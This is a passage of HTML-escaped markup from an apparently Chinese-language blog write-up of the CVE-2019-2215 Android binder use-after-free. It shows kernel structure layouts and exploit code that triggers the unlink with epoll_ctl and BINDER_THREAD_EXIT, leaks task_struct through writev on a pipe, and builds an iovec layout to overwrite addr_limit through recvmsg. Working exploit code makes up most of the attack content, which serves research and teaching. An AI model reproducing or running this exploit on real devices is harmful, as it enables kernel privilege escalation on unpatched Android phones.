+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;19
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;20
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;21
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;list_head&lt;/span&gt; {
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;list_head&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;next, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;prev;
+};
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;wait_queue_head&lt;/span&gt; {
+        spinlock_t              lock; &lt;span style=&#34;color:#75715e&#34;&gt;// 8 Bytes
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;list_head&lt;/span&gt;        head;
+};
+&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;wait_queue_head&lt;/span&gt; wait_queue_head_t;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// spinlock_t finally will be below in arm64 8Bytes
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;typedef&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
+&lt;span style=&#34;color:#75715e&#34;&gt;#ifdef __AARCH64EB__
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        u16 next;
+        u16 owner;
+&lt;span style=&#34;color:#75715e&#34;&gt;#else
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        u16 owner;
+        u16 next;
+&lt;span style=&#34;color:#75715e&#34;&gt;#endif
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;} __aligned(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) arch_spinlock_t;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.exiahan.com/images/cve20192215/wait_head_offset.png&#34; alt=&#34;wait.head offset&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;unlink关键利用代码如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;19
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;20
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;21
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;22
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;pid_t fork_ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fork();
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fork_ret &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fork&amp;#34;&lt;/span&gt;);
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fork_ret &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
+&lt;span style=&#34;color:#75715e&#34;&gt;/* Child process */&lt;/span&gt;
+prctl(PR_SET_PDEATHSIG, SIGKILL);
+sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);
+printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CHILD: Doing EPOLL_CTL_DEL.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;event);
+printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CHILD: Finished EPOLL_CTL_DEL.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+&lt;span style=&#34;color:#75715e&#34;&gt;// first page: dummy data
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (read(pipefd[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], page_buffer, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(page_buffer)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(page_buffer)) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;read full pipe&amp;#34;&lt;/span&gt;);
+close(pipefd[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]);
+printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CHILD: Finished write to FIFO.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+
+exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+}
+&lt;span style=&#34;color:#75715e&#34;&gt;//printf(&amp;#34;PARENT: Calling READV\n&amp;#34;);
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
+b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; writev(pipefd[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], iovec_array, IOVEC_ARRAY_SZ);
+printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;writev() returns 0x%x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)b);
+&lt;span style=&#34;color:#75715e&#34;&gt;// second page: leaked data
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (read(pipefd[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], page_buffer, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(page_buffer)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(page_buffer)) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;read full pipe&amp;#34;&lt;/span&gt;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;24-overwrite-addr_limit&#34;&gt;2.4 Overwrite addr_limit&lt;/h3&gt;
+&lt;p&gt;前面已经拿到了进程的&lt;code&gt;task_struct&lt;/code&gt;，下面将会重复类用与上面相似的&lt;code&gt;iovec[25]&lt;/code&gt;布局去尝试改写&lt;code&gt;addr_limit&lt;/code&gt;。 与leaking &lt;code&gt;task_struct&lt;/code&gt;相比，不同之处在于本次不再用&lt;code&gt;writev&lt;/code&gt;，而使用&lt;code&gt;recvmsg&lt;/code&gt;去接收&lt;code&gt;iovsec[25]&lt;/code&gt;，阻塞等待，直到&lt;code&gt;write&lt;/code&gt;写入数据篡改&lt;code&gt;addr_limit&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;利用&lt;code&gt;socket&lt;/code&gt;，同样可以如读写&lt;code&gt;iovec&lt;/code&gt;数组：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;msghdr&lt;/span&gt; msg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
+.msg_iov &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; iovec_array,
+.msg_iovlen &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; IOVEC_ARRAY_SZ
+};
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里只需准备好&lt;code&gt;msghdr&lt;/code&gt;结构体，而后利用&lt;code&gt;recvmsg&lt;/code&gt;等待数据写入&lt;code&gt;iovec[25]&lt;/code&gt;即可。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; recvmsg_result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; recvmsg(socks[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;msg, MSG_WAITALL);
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;再看本次unlink前使用的内存布局：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;iovec&lt;/span&gt; iovec_array[IOVEC_ARRAY_SZ];
+memset(iovec_array, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(iovec_array));
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// Unlink Layout
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;iovec_array[IOVEC_INDX_FOR_WQ].iov_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dummy_page_4g_aligned; &lt;span style=&#34;color:#75715e&#34;&gt;/* spinlock in the low address half must be zero */&lt;/span&gt;
+iovec_array[IOVEC_INDX_FOR_WQ].iov_len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;/* wq-&amp;gt;task_list-&amp;gt;next */&lt;/span&gt;
+iovec_array[IOVEC_INDX_FOR_WQ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;].iov_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0xDEADBEEF&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;/* wq-&amp;gt;task_list-&amp;gt;prev */&lt;/span&gt;
+iovec_array[IOVEC_INDX_FOR_WQ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;].iov_len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;/* iov_len of previous, then this element and next element */&lt;/span&gt;
+iovec_array[IOVEC_INDX_FOR_WQ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;].iov_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0xBEEFDEAD&lt;/span&gt;;
+iovec_array[IOVEC_INDX_FOR_WQ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;].iov_len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;/* should be correct from the start, kernel will sum up lengths when importing */&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://blog.exiahan.com/images/cve20192215/secondary_iovec_layout.jpg&#34; alt=&#34;secondary iovec layout&#34;&gt;&lt;/p&gt;
+&lt;p&gt;本次布局和前次略有不同:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;iovec[10].iov_len = 1&lt;/code&gt;，这里在后面会在创建socket后首先写入1 Byte到&lt;code&gt;dummy_page_4g_aligned&lt;/code&gt;指向的内存，令&lt;code&gt;write&lt;/code&gt;下次写入时将从&lt;code&gt;iovsec[11].iov_base&lt;/code&gt;指向的内存块开始写入数据。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; socks[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (socketpair(AF_UNIX, SOCK_STREAM, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, socks)) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;socketpair&amp;#34;&lt;/span&gt;);
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (write(socks[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;write socket dummy byte&amp;#34;&lt;/span&gt;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;接下来触发unlink漏洞：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
